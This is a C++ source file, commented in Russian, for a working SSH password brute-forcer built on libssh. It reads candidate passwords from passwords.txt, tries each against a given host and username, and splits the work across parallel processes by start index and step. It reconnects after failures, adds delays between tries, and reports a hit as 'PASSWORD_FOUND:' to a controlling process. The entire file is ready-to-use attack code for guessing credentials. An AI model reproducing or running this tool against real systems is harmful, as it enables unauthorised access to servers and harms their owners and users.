#include <libssh/libssh.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <unistd.h>
#include <chrono>
#include <cstdlib>

std::mutex output_mutex;

void attemptSSHLogin(const std::string& hostname, const std::string& username,
                     const std::vector<std::string>& passwords, int start_index, int step) {
    size_t i = start_index;
    ssh_session session = nullptr;
    while (i < passwords.size()) {
        // Если сессия не установлена, создаём новую
        if (session == nullptr) {
            session = ssh_new();
            if (session == nullptr) {
                std::lock_guard<std::mutex> lock(output_mutex);
                std::cerr << "[ERROR] Не удалось создать ssh-сессию" << std::endl;
                std::this_thread::sleep_for(std::chrono::seconds(1));
                continue;
            }
            int timeout = 10;
            ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
            ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
            ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());

            if (ssh_connect(session) != SSH_OK) {
                std::lock_guard<std::mutex> lock(output_mutex);
                std::cerr << "[ERROR] Подключение к " << hostname << " не удалось: "
                          << ssh_get_error(session) << std::endl;
                ssh_free(session);
                session = nullptr;
                std::this_thread::sleep_for(std::chrono::seconds(1));
                continue; // пробуем переподключиться
            }
            ssh_set_blocking(session, 1);
        }

        const std::string& password = passwords[i];
        {
            std::lock_guard<std::mutex> lock(output_mutex);
            std::cout << "[INFO] Проверка пароля [" << i << "]: " << password << std::endl;
            std::cout.flush();
        }

        int auth = ssh_userauth_password(session, nullptr, password.c_str());

        if (auth == SSH_AUTH_SUCCESS) {
            {
                std::lock_guard<std::mutex> lock(output_mutex);
                std::cout << "[INFO] Найден правильный пароль: " << password << std::endl;
                std::cout.flush();
            }
            // Сообщаем контроллеру о найденном пароле
            std::cout << "PASSWORD_FOUND:" << password << std::endl;
            ssh_disconnect(session);
            ssh_free(session);
            exit(0);
        } else if (auth == SSH_AUTH_DENIED) {
            {
                std::lock_guard<std::mutex> lock(output_mutex);
                std::cerr << "[ERROR] Неверный пароль: " << password << std::endl;
                std::cerr.flush();
            }
            i += step; // переходим к следующему паролю для текущего процесса
        } else {
            // Если получен другой код, мб, проблема в соединении – перезапускаем сессию
            {
                std::lock_guard<std::mutex> lock(output_mutex);
                std::cerr << "[ERROR] Ошибка авторизации (" << auth << ") для пароля: " 
                          << password << ". Переподключение..." << std::endl;
                std::cerr.flush();
            }
            ssh_disconnect(session);
            ssh_free(session);
            session = nullptr;
            // Не увеличиваем i, чтобы повторить попытку для того же пароля после восстановления соединения
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }

        int delay_ms = 200 + (i / 10) * 50;
        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
    }

    if (session != nullptr) {
        ssh_disconnect(session);
        ssh_free(session);
    }
    {
        std::lock_guard<std::mutex> lock(output_mutex);
        std::cout << "[INFO] Перебор паролей завершён для данного процесса!" << std::endl;
        std::cout.flush();
    }
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Использование: " << argv[0] << " <hostname> <username> <start_index> <step>" << std::endl;
        return 1;
    }

    std::string hostname = argv[1];
    std::string username = argv[2];
    int start_index = std::stoi(argv[3]);
    int step = std::stoi(argv[4]);

    std::vector<std::string> passwords;
    std::ifstream file("passwords.txt");

    if (!file) {
        std::cerr << "[ERROR] Не удалось открыть файл passwords.txt" << std::endl;
        return 1;
    }

    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty()) {
            passwords.push_back(line);
        }
    }
    file.close();

    if (passwords.empty()) {
        std::cerr << "[ERROR] Файл passwords.txt пуст!" << std::endl;
        return 1;
    }

    attemptSSHLogin(hostname, username, passwords, start_index, step);

    return 0;
}
